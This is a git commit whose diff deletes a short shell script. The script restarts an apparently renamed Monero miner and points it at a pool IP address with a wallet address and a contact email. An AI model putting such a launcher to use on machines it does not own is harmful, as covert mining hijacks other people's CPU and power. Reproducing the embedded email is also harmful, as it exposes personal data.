961ea60d4fc7281e2ac2b284eaaa60c178b6429b
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-07-31 11:52:15 +0300

    Delete 65.sh

--- 65.sh
+++
@@ -1,3 +0,0 @@
-pkill poler
-sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 77 --cpu-priority 4 -o 192.155.111.169:5999 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w18-fckin-final3:ivanovandrey1984g@gmail.com -k
